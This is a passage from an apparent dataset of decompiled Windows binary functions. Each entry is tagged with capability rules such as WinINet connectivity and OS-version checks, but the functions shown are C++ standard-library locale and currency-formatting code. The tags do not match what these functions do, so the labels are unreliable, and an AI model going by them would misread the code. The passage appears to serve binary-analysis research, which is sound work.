do {\n                            fcn.0040c5c0(0x30);\n                            iVar14 = iVar14 + -1;\n                        } while (iVar14 != 0);\n                        iVar17 = *(unaff_EBP + -0xb0);\n                    }\n                    *(unaff_EBP + -4) = 3;\n                    fcn.00406810();\n                    uVar12 = *(unaff_EBP + -0x60);\n                    goto code_r0x004366af;\n                }\n                pcVar1 = *(**(unaff_EBP + -100) + 0x10);\n                (**0x4742a4)();\n                cVar4 = (*pcVar1)();\n                *(unaff_EBP + -0x65) = cVar4;\n                if (cVar4 == '\\0') goto code_r0x00436945;\n                puVar9 = unaff_EBP + -0x40;\n                if (0xf < *(unaff_EBP + -0x2c)) {\n                    puVar9 = *(unaff_EBP + -0x40);\n                }\n                if (0x7e < *puVar9) goto code_r0x00436945;\n                *(unaff_EBP + -0x14) = 0xf;\n                *(unaff_EBP + -0x18) = 0;\n                *(unaff_EBP + -0x28) = 0;\n                fcn.0040acd0(1, 0);\n                *(unaff_EBP + -4) = 0xb;\n                iVar14 = 0;\n                uVar7 = fcn.00424ec3(*(unaff_EBP + -0x70));\n                if (uVar7 == '\\0') {\n                    do {\n                        if (*(iVar17 + 4) == '\\0') {\n                            uVar7 = fcn.00423d04();\n                        }\n                        uVar7 = uVar7 & 0xffffff00 | *(iVar17 + 5);\n                        *(unaff_EBP + -0xa0) = uVar7;\n                        uVar7 = fcn.00421578(*(unaff_EBP + -0x8c), uVar7);\n                        if (uVar7 < 10) {\n                            *(unaff_EBP + -0x9c) = \"0123456789-\"[uVar7];\n                            fcn.0040c5c0(*(unaff_EBP + -0x9c));\n                            iVar15 = unaff_EBP + -0x28;\n                            if (0xf < *(unaff_EBP + -0x14)) {\n                                iVar15 = *(unaff_EBP + -0x28);\n                            }\n                            if (*(iVar15 + iVar14) != '\\x7f') {\n                                iVar15 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    iVar15 = *(unaff_EBP + -0x28);\n                                }\n                                *(iVar15 + iVar14) = *(iVar15 + iVar14) + '\\x01';\n                            }\n                        }\n                        else {\n                            iVar15 = *(unaff_EBP + -0x28);\n                            iVar10 = unaff_EBP + -0x28;\n                            if (0xf < *(unaff_EBP + -0x14)) {\n                                iVar10 = iVar15;\n                            }\n                            if (*(iVar10 + iVar14) == '\\0') goto code_r0x004368ab;\n                            if (*(iVar17 + 4) == '\\0') {\n                                fcn.00423d04();\n                                cVar4 = *(iVar17 + 5);\n                                iVar15 = *(unaff_EBP + -0x28);\n                            }\n                            else {\n                                cVar4 = *(unaff_EBP + -0xa0);\n                            }\n                            if (cVar4 != *(unaff_EBP + -0x65)) goto code_r0x004368ab;\n                            fcn.00406de0(1, 0);\n                            iVar14 = iVar14 + 1;\n                        }\n                        fcn.004234d8();\n                        uVar7 = fcn.00424ec3(*(unaff_EBP + -0x70));\n                    } while (uVar7 == '\\0');\n                    iVar15 = *(unaff_EBP + -0x28);\ncode_r0x004368ab:\n                    if (iVar14 == 0) goto code_r0x004368c1;\n                    iVar10 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar10 = iVar15;\n                    }\n                    if ('\\0' < *(iVar10 + iVar14)) {\n                        iVar14 = iVar14 + 1;\n                        goto code_r0x004368c1;\n                    }\n                    cVar4 = '\\x01';\n                    *(unaff_EBP + -0x59) = 1;\n                }\n                else {\ncode_r0x004368c1:\n                    cVar4 = *(unaff_EBP + -0x59);\n                }\n                pcVar16 = unaff_EBP + -0x40;\n                if (0xf < *(unaff_EBP + -0x2c)) {\n                    pcVar16 = *(unaff_EBP + -0x40);\n                }\n                if (cVar4 == '\\0') {\n                    while( true ) {\n                        if ((iVar14 == 0) || (cVar4 = *pcVar16,  cVar4 == '\\x7f')) goto code_r0x00436920;\n                        iVar14 = iVar14 + -1;\n                        if (iVar14 != 0) break;\ncode_r0x004368f5:\n                        if (iVar14 == 0) {\n                            pcVar13 = unaff_EBP + -0x28;\n                            if (0xf < *(unaff_EBP + -0x14)) {\n                                pcVar13 = *(unaff_EBP + -0x28);\n                            }\n                            if (cVar4 < *pcVar13) goto code_r0x0043691c;\n                        }\n                        if ('\\0' < pcVar16[1]) {\n                            pcVar16 = pcVar16 + 1;\n                        }\n                    }\n                    iVar15 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar15 = *(unaff_EBP + -0x28);\n                    }\n                    if (cVar4 == *(iVar15 + iVar14)) goto code_r0x004368f5;\ncode_r0x0043691c:\n                    *(unaff_EBP + -0x59) = 1;\n                }\ncode_r0x00436920:\n                fcn.00406810();\n                if (*(unaff_EBP + -0x59) == '\\0') {\n                    *(unaff_EBP + -4) = 10;\n                    goto code_r0x004369a5;\n                }\n                *(unaff_EBP + -4) = 3;\n            }\n            fcn.00406810();\ncode_r0x004366af:\n            cVar4 = *(unaff_EBP + -0x59);\n        }\ncode_r0x004366b2:\n        *(unaff_EBP + -0x78) = *(unaff_EBP + -0x78) + 1;\n        uVar7 = *(unaff_EBP + -0x78);\n    } while (cVar4 == '\\0');\n    if (*(unaff_EBP + -0x59) == '\\0') {\n        uVar7 = *(unaff_EBP + -0x48);\n        if (1 < uVar7) {\n            uVar12 = *(unaff_EBP + -0x44);\n            pcVar16 = *(unaff_EBP + -0x58);\n            pcVar13 = unaff_EBP + -0x58;\n            if (0xf < uVar12) {\n                pcVar13 = pcVar16;\n            }\n            while( true ) {\n                pcVar11 = unaff_EBP + -0x58;\n                if (0xf < uVar12) {\n                    pcVar11 = pcVar16;\n                }\n                pcVar13 = pcVar13 + 1;\n                if (pcVar13 == pcVar11 + uVar7) goto code_r0x00436edf;\n                cVar4 = fcn.00424ec3(*(unaff_EBP + -0x70));\n                if (cVar4 != '\\0') break;\n                if (*(iVar17 + 4) == '\\0') {\n                    fcn.00423d04();\n                }\n                if (*(iVar17 + 5) != *pcVar13) break;\n                fcn.004234d8();\n                uVar12 = *(unaff_EBP + -0x44);\n                uVar7 = *(unaff_EBP + -0x48);\n                pcVar16 = *(unaff_EBP + -0x58);\n            }\n            uVar12 = *(unaff_EBP + -0x44);\n            uVar7 = *(unaff_EBP + -0x48);\n            pcVar16 = *(unaff_EBP + -0x58);\ncode_r0x00436edf:\n            pcVar11 = unaff_EBP + -0x58;\n            if (0xf < uVar12) {\n                pcVar11 = pcVar16;\n            }\n            if (pcVar13 != pcVar11 + uVar7) goto code_r0x00436f05;\n        }\n        if (*(unaff_EBP + -0x66) != '\\0') {\n            fcn.00424fe8(0, 1, 0);\n        }\n    }\n    else {\ncode_r0x00436f05:\n        fcn.004351bf(0);\n    }\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 7414
    },
    "00436f22": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00436f22(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *puVar6;\n    uint var_40h;\n    uint var_14h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    fcn.0043ad3e(0x34);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    puVar2 = fcn.004257ac(unaff_EBP + -0x40);\n    puVar6 = extraout_ECX + 0x2c;\n    for (iVar5 = 0xb; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    iVar5 = fcn.0045b6c6();\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    *(extraout_ECX + 0x18) = 0;\n    uVar3 = *(iVar5 + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.0042170c(uVar3);\n    *(extraout_ECX + 8) = uVar3;\n    fcn.0043569b(0, iVar5);\n    if (*(extraout_ECX + 0x28) == '\\0') {\n        cVar1 = *(iVar5 + 0x29);\n    }\n    else {\n        cVar1 = *(iVar5 + 0x28);\n    }\n    iVar4 = cVar1;\n    *(extraout_ECX + 0x1c) = iVar4;\n    if ((iVar4 < 0) || (0x7e < iVar4)) {\n        *(extraout_ECX + 0x1c) = 0;\n    }\n    fcn.0043739a(extraout_ECX + 0x20, *(iVar5 + 0x2b), *(iVar5 + 0x2a), *(iVar5 + 0x2e));\n    fcn.0043739a(extraout_ECX + 0x24, *(iVar5 + 0x2d), *(iVar5 + 0x2c), *(iVar5 + 0x2f));\n    if (*(unaff_EBP + 0xc) != '\\0') {\n        *(extraout_ECX + 0x20) = 0x76782b24;\n        *(extraout_ECX + 0x24) = 0x76782b24;\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 704
    },
    "00437042": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00437042(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    uint8_t uVar1;\n    uint uVar2;\n    code **ppcVar3;\n    int32_t iVar4;\n    uint arg_10h_00;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t unaff_EBP;\n    ulong uVar7;\n    uint var_10h;\n    code **ppcVar8;\n    uint var_4h;\n    uint uVar9;\n    \n    uVar9 = 4;\n    fcn.0043acd3();\n    uVar6 = 0;\n    ppcVar8 = NULL;\n    uVar1 = fcn.00435df9(0, 0);\n    arg_8h_00 = *(unaff_EBP + 0x10);\n    if ((*(unaff_EBP + 0xc) & (1 << (uVar1 & 0x1f)) >> 1) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar8 = fcn.0043a4f7(0x10, uVar9);\n            *(unaff_EBP + -0x10) = ppcVar8;\n            if (ppcVar8 == NULL) {\n                ppcVar8 = NULL;\n            }\n            else {\n                ppcVar8[1] = NULL;\n                *ppcVar8 = vtable.std::collate_char_.0;\n                uVar7 = fcn.00439a13();\n                ppcVar8[2] = uVar7;\n                ppcVar8[3] = uVar7 >> 0x20;\n            }\n            uVar2 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar8, uVar2);\n        }\n        else {\n            ppcVar8 = fcn.00401800();\n            uVar2 = fcn.004357a3(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar2, ppcVar8);\n        }\n    }\n    uVar5 = *(unaff_EBP + 0xc);\n    if ((uVar5 & 0x20) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar8 = fcn.0043a4f7(8, uVar9);\n            *(unaff_EBP + -0x10) = ppcVar8;\n            if (ppcVar8 == NULL) {\n                ppcVar8 = NULL;\n            }\n            else {\n                ppcVar8[1] = NULL;\n                *ppcVar8 = vtable.std::messages_char_.0;\n            }\n            uVar2 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar8, uVar2);\n        }\n        else {\n            ppcVar8 = fcn.00401800();\n            uVar2 = fcn.00435849(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar2, ppcVar8);\n        }\n        uVar5 = *(unaff_EBP + 0xc);\n    }\n    if ((uVar5 & 4) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar8 = fcn.0043a4f7(8, uVar9);\n            *(unaff_EBP + -0x10) = ppcVar8;\n            if (ppcVar8 == NULL) {\n                ppcVar8 = NULL;\n            }\n            else {\n                ppcVar8[1] = NULL;\n                *ppcVar8 = \n                vtable.std::money_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0;\n            }\n            uVar2 = fcn.00401800();\n            uVar9 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar8, uVar2);\n            ppcVar8 = fcn.0043a4f7(8, uVar9);\n            *(unaff_EBP + -0x10) = ppcVar8;\n            if (ppcVar8 == NULL) {\n                ppcVar8 = NULL;\n            }\n            else {\n                ppcVar8[1] = NULL;\n                *ppcVar8 = \n                vtable.std::money_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n            }\n            uVar2 = fcn.00401800();\n            uVar9 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar8, uVar2);\n            ppcVar3 = fcn.0043a4f7(0x58, uVar9);\n            *(unaff_EBP + -0x10) = ppcVar3;\n            *(unaff_EBP + -4) = 7;\n            if (ppcVar3 == NULL) {\n                ppcVar3 = NULL;\n            }\n            else {\n                ppcVar3[1] = NULL;\n                ppcVar8 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 8;\n                *ppcVar3 = vtable.std::_Mpunct_char_.0;\n                *(ppcVar3 + 10) = 0;\n                fcn.00436f22(ppcVar8, 0);\n                *ppcVar3 = vtable.std::moneypunct_char__0_.0;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar2 = fcn.00401800();\n            uVar9 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar3, uVar2);\n            ppcVar3 = fcn.0043a4f7(0x58, uVar9);\n            *(unaff_EBP + -0x10) = ppcVar3;\n            *(unaff_EBP + -4) = 0xd;\n            if (ppcVar3 == NULL) {\n                ppcVar3 = NULL;\n            }\n            else {\n                ppcVar3[1] = NULL;\n                uVar9 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0xe;\n                *ppcVar3 = vtable.std::_Mpunct_char_.0;\n                *(ppcVar3 + 10) = 1;\n                fcn.00436f22(uVar9, 0);\n                *ppcVar3 = vtable.std::moneypunct_char__1_.0;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar9 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar3, uVar9);\n        }\n        else {\n            uVar9 = fcn.00401800();\n            uVar2 = fcn.004358ef(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar2, uVar9);\n            uVar9 = fcn.00401800();\n            uVar2 = fcn.00435995(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar2, uVar9);\n            uVar9 = fcn.00401800();\n            uVar2 = fcn.00435ae1(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar2, uVar9);\n            ppcVar8 = fcn.00401800();\n            uVar9 = fcn.00435a3b(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar9, ppcVar8);\n        }\n        uVar5 = *(unaff_EBP + 0xc);\n    }\n    if ((uVar5 & 0x10) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            iVar4 = fcn.0043a4f7(0x44, ppcVar8);\n            *(unaff_EBP + -0x10) = iVar4;\n            *(unaff_EBP + -4) = 0x12;\n            if (iVar4 == 0) {\n                uVar9 = 0;\n            }\n            else {\n                uVar9 = fcn.00435cd3(*(unaff_EBP + 8), 0);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            arg_10h_00 = fcn.00401800();\n            uVar2 = arg_8h_00;\n            fcn.00423876(arg_8h_00, uVar9, arg_10h_00);\n            iVar4 = fcn.0043a4f7(0xc, uVar2);\n            *(unaff_EBP + -0x10) = iVar4;\n            if (iVar4 != 0) {\n                uVar6 = fcn.00435d06(*(unaff_EBP + 8), 0);\n            }\n            uVar9 = fcn.00401800();\n            fcn.00423876(arg_8h_00, uVar6, uVar9);\n        }\n        else {\n            uVar6 = fcn.00401800();\n            uVar9 = fcn.00435b87(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar9, uVar6);\n            uVar6 = fcn.00401800();\n            uVar9 = fcn.00435c2d(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar9, uVar6);\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 2345
    },
    "0043742f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.0043742f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint noname_9, uint noname_10, uint arg_34h, uint arg_38h, uint arg_3ch)\n\n{\n    char cVar1;\n    uint arg_14h_00;\n    uchar uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint *puVar6;\n    int32_t arg_8h_00;\n    int32_t iVar7;\n    uint32_t uVar8;\n    char cVar9;\n    uint arg_ch_00;\n    int32_t unaff_EBP;\n    code *pcVar10;\n    uint32_t uVar11;\n    uint uVar12;\n    int32_t arg_18h_00;\n    uint var_f0h;\n    uint var_e8h;\n    uint var_e0h;\n    uint var_d8h;\n    uint var_d0h;\n    uint var_c8h;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b0h;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint var_58h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0xe4);\n    *(unaff_EBP + -0xa0) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x3c);\n    uVar12 = *(*(unaff_EBP + 0x18) + 0x30);\n    *(unaff_EBP + -4) = 0;\n    fcn.00421bb3(uVar12);\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar3 = fcn.00435ae1(unaff_EBP + -0x94);\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar3 = fcn.00435a3b(unaff_EBP + -0x94);\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.00401990();\n    pcVar10 = *(*piVar3 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x40);\n    (*pcVar10)();\n    iVar7 = *piVar3;\n    *(unaff_EBP + -4) = 3;\n    pcVar10 = *(iVar7 + 0x24);\n    (**0x4742a4)();\n    uVar4 = (*pcVar10)();\n    uVar4 = (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f);\n    *(unaff_EBP + -0x7c) = uVar4;\n    if (*(unaff_EBP + 0x34) < uVar4 || *(unaff_EBP + 0x34) == uVar4) {\n        fcn.00424fe8(0, (uVar4 - *(unaff_EBP + 0x34)) + 1, *(unaff_EBP + -0x88));\n    }\n    else {\n        pcVar5 = unaff_EBP + -0x40;\n        if (0xf < *(unaff_EBP + -0x2c)) {\n            pcVar5 = *(unaff_EBP + -0x40);\n        }\n        if (*pcVar5 != '\\x7f') {\n            pcVar5 = unaff_EBP + -0x40;\n            if (0xf < *(unaff_EBP + -0x2c)) {\n                pcVar5 = *(unaff_EBP + -0x40);\n            }\n            if ('\\0' < *pcVar5) {\n                pcVar10 = *(*piVar3 + 0x10);\n                (**0x4742a4)();\n                uVar2 = (*pcVar10)();\n                pcVar5 = unaff_EBP + -0x40;\n                *(unaff_EBP + -0x78) = uVar2;\n                if (0xf < *(unaff_EBP + -0x2c)) {\n                    pcVar5 = *(unaff_EBP + -0x40);\n                }\n                uVar4 = *(unaff_EBP + 0x34) - *(unaff_EBP + -0x7c);\n                while (((cVar9 = *pcVar5,  cVar9 != '\\x7f' && ('\\0' < cVar9)) && (cVar9 < uVar4))) {\n                    uVar4 = uVar4 - cVar9;\n                    fcn.00424fe8(uVar4, 1, *(unaff_EBP + -0x78));\n                    if ('\\0' < pcVar5[1]) {\n                        pcVar5 = pcVar5 + 1;\n                    }\n                }\n                uVar4 = *(unaff_EBP + -0x7c);\n            }\n        }\n    }\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 0xf;\n    *(unaff_EBP + -0x28) = 0;\n    iVar7 = *piVar3;\n    *(unaff_EBP + -4) = 4;\n    if (*(unaff_EBP + 0x20) == '\\0') {\n        (**0x4742a4)(unaff_EBP + -0x78);\n        (**(iVar7 + 0x28))();\n        *(unaff_EBP + -0x84) = *(unaff_EBP + -0x78);\n        pcVar10 = *(*piVar3 + 0x1c);\n    }\n    else {\n        (**0x4742a4)();\n        (**(iVar7 + 0x2c))();\n        *(unaff_EBP + -0x84) = *(unaff_EBP + -0x78);\n        pcVar10 = *(*piVar3 + 0x20);\n    }\n    (**0x4742a4)(unaff_EBP + -0x70);\n    (*pcVar10)();\n    fcn.00405640(unaff_EBP + -0x70);\n    fcn.00406810();\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0xf;\n    *(unaff_EBP + -0x58) = 0;\n    *(unaff_EBP + -4) = 5;\n    if ((*(*(unaff_EBP + -0x8c) + 0x14) & 8) != 0) {\n        pcVar10 = *(*piVar3 + 0x18);\n        (**0x4742a4)(unaff_EBP + -0x70);\n        (*pcVar10)();\n        fcn.00405640(unaff_EBP + -0x70);\n        fcn.00406810();\n    }\n    cVar9 = '\\0';\n    uVar8 = 0;\n    *(unaff_EBP + -0x71) = 0;\n    uVar11 = 0;\n    do {\n        cVar1 = *(unaff_EBP + -0x84 + uVar11);\n        if (cVar1 == ' ') {\n            uVar8 = uVar8 + 1;\ncode_r0x00437695:\n            if (uVar11 != 3) {\n                cVar9 = '\\x01';\n                *(unaff_EBP + -0x71) = 1;\n            }\n        }\n        else if (cVar1 == '$') {\n            uVar8 = uVar8 + *(unaff_EBP + -0x48);\n        }\n        else if (cVar1 == '+') {\n            uVar8 = uVar8 + *(unaff_EBP + -0x18);\n        }\n        else if (cVar1 == 'v') {\n            if (*(unaff_EBP + 0x34) < uVar4 || *(unaff_EBP + 0x34) == uVar4) {\n                iVar7 = (uVar4 - *(unaff_EBP + 0x34)) + 1;\n            }\n            else {\n                iVar7 = 0;\n            }\n            cVar9 = *(unaff_EBP + -0x71);\n            uVar8 = uVar8 + (uVar4 != 0) + *(unaff_EBP + 0x34) + iVar7;\n        }\n        else if (cVar1 == 'x') goto code_r0x00437695;\n        uVar11 = uVar11 + 1;\n    } while (uVar11 < 4);\n    iVar7 = *(unaff_EBP + -0x8c);\n    uVar4 = *(iVar7 + 0x20);\n    if (((*(iVar7 + 0x24) < 0) || ((*(iVar7 + 0x24) < 1 && (uVar4 == 0)))) || (uVar4 <= uVar8)) {\n        arg_18h_00 = 0;\n    }\n    else {\n        arg_18h_00 = uVar4 - uVar8;\n    }\n    uVar4 = *(iVar7 + 0x14) & 0x1c0;\n    *(unaff_EBP + -0x90) = uVar4;\n    if ((uVar4 == 0x40) || ((uVar4 == 0x100 && (cVar9 != '\\0')))) {\n        uVar12 = *(unaff_EBP + 0x10);\n        arg_ch_00 = *(unaff_EBP + 0xc);\n    }\n    else {\n        puVar6 = fcn.004379b4(unaff_EBP + -0xa8, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + -0x80), \n                              arg_18h_00);\n        arg_18h_00 = 0;\n        arg_ch_00 = *puVar6;\n        *(unaff_EBP + 0xc) = arg_ch_00;\n        uVar12 = puVar6[1];\n        *(unaff_EBP + 0x10) = uVar12;\n    }\n    uVar4 = 0;\n    *(unaff_EBP + -0x78) = 0;\n    do {\n        cVar9 = *(unaff_EBP + -0x84 + uVar4);\n        if (cVar9 == ' ') {\n            puVar6 = fcn.004379b4(unaff_EBP + -0xf0, arg_ch_00, uVar12, *(unaff_EBP + -0x80), 1);\n            arg_ch_00 = *puVar6;\n            *(unaff_EBP + 0xc) = arg_ch_00;\n            uVar12 = puVar6[1];\n            *(unaff_EBP + 0x10) = uVar12;\ncode_r0x004378f4:\n            if (*(unaff_EBP + -0x90) != 0x100) goto code_r0x00437922;\n            puVar6 = fcn.004379b4(unaff_EBP + -0xb0, arg_ch_00, uVar12, *(unaff_EBP + -0x80), arg_18h_00);\n            arg_18h_00 = 0;\ncode_r0x00437917:\n            arg_ch_00 = *puVar6;\n            *(unaff_EBP + 0xc) = arg_ch_00;\n            uVar12 = puVar6[1];\n            *(unaff_EBP + 0x10) = uVar12;\n        }\n        else {\n            if (cVar9 == '$') {\n                iVar7 = unaff_EBP + -0x58;\n                if (0xf < *(unaff_EBP + -0x44)) {\n                    iVar7 = *(unaff_EBP + -0x58);\n                }\n                var_18h = *(unaff_EBP + -0x48);\n                arg_8h_00 = unaff_EBP + -0xe8;\ncode_r0x0043776b:\n                puVar6 = fcn.004373f8(arg_8h_00, arg_ch_00, uVar12, iVar7, var_18h);\n                goto code_r0x00437917;\n            }\n            if (cVar9 == '+') {\n                if (*(unaff_EBP + -0x18) != 0) {\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    var_18h = 1;\n                    arg_8h_00 = unaff_EBP + -0xe0;\n                    goto code_r0x0043776b;\n                }\n            }\n            else {\n                if (cVar9 == 'v') {\n                    uVar4 = *(unaff_EBP + -0x7c);\n                    if (uVar4 == 0) {\n                        iVar7 = unaff_EBP + 0x24;\n                        if (0xf < *(unaff_EBP + 0x38)) {\n                            iVar7 = *(unaff_EBP + 0x24);\n                        }\n                        var_18h = *(unaff_EBP + 0x34);\n                        arg_8h_00 = unaff_EBP + -0xb8;\n                    }\n                    else if (*(unaff_EBP + 0x34) < uVar4 || *(unaff_EBP + 0x34) == uVar4) {\n                        fcn.00421c28(*(unaff_EBP + -0x88));\n                        pcVar10 = *(*piVar3 + 0xc);\n                        (**0x4742a4)();\n                        uVar2 = (*pcVar10)();\n                        *(unaff_EBP + -0x9c) = uVar2;\n                        fcn.00421c28(*(unaff_EBP + -0x9c));\n                        puVar6 = fcn.004379b4(unaff_EBP + -0xc0, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                                              *(unaff_EBP + -0x88), *(unaff_EBP + -0x7c) - *(unaff_EBP + 0x34));\n                        *(unaff_EBP + 0xc) = *puVar6;\n                        *(unaff_EBP + 0x10) = puVar6[1];\n                        iVar7 = unaff_EBP + 0x24;\n                        if (0xf < *(unaff_EBP + 0x38)) {\n                            iVar7 = *(unaff_EBP + 0x24);\n                        }\n                        var_18h = *(unaff_EBP + 0x34);\n                        uVar12 = puVar6[1];\n                        arg_8h_00 = unaff_EBP + -200;\n                        arg_ch_00 = *puVar6;\n                    }\n                    else {\n                        *(unaff_EBP + -0x98) = unaff_EBP + 0x24;\n                        if (0xf < *(unaff_EBP + 0x38)) {\n                            *(unaff_EBP + -0x98) = *(unaff_EBP + 0x24);\n                        }\n                        puVar6 = fcn.004373f8(unaff_EBP + -0xd0, arg_ch_00, uVar12, *(unaff_EBP + -0x98), \n                                              *(unaff_EBP + 0x34) - uVar4);\n                        *(unaff_EBP + 0xc) = *puVar6;\n                        *(unaff_EBP + 0x10) = puVar6[1];\n                        pcVar10 = *(*piVar3 + 0xc);\n                        (**0x4742a4)();\n                        uVar2 = (*pcVar10)();\n                        *(unaff_EBP + -0xa4) = uVar2;\n                        fcn.00421c28(*(unaff_EBP + -0xa4));\n                        iVar7 = unaff_EBP + 0x24;\n                        if (0xf < *(unaff_EBP + 0x38)) {\n                            iVar7 = *(unaff_EBP + 0x24);\n                        }\n                        var_18h = *(unaff_EBP + -0x7c);\n                        iVar7 = (*(unaff_EBP + 0x34) + iVar7) - var_18h;\n                        uVar12 = *(unaff_EBP + 0x10);\n                        arg_8h_00 = unaff_EBP + -0xd8;\n                        arg_ch_00 = *(unaff_EBP + 0xc);\n                    }\n                    goto code_r0x0043776b;\n                }\n                if (cVar9 == 'x') goto code_r0x004378f4;\n            }\n        }\ncode_r0x00437922:\n        uVar4 = *(unaff_EBP + -0x78) + 1;\n        *(unaff_EBP + -0x78) = uVar4;\n        if (3 < uVar4) {\n            if (1 < *(unaff_EBP + -0x18)) {\n                iVar7 = unaff_EBP + -0x28;\n                if (0xf < *(unaff_EBP + -0x14)) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                puVar6 = fcn.004373f8(unaff_EBP + -0xb0, arg_ch_00, uVar12, iVar7 + 1, *(unaff_EBP + -0x18) + -1);\n                arg_ch_00 = *puVar6;\n                *(unaff_EBP + 0xc) = arg_ch_00;\n                uVar12 = puVar6[1];\n                *(unaff_EBP + 0x10) = uVar12;\n            }\n            iVar7 = *(unaff_EBP + -0x8c);\n            arg_14h_00 = *(unaff_EBP + -0x80);\n            *(iVar7 + 0x20) = 0;\n            *(iVar7 + 0x24) = 0;\n            fcn.004379b4(*(unaff_EBP + -0xa0), arg_ch_00, uVar12, arg_14h_00, arg_18h_00);\n            fcn.00406810();\n            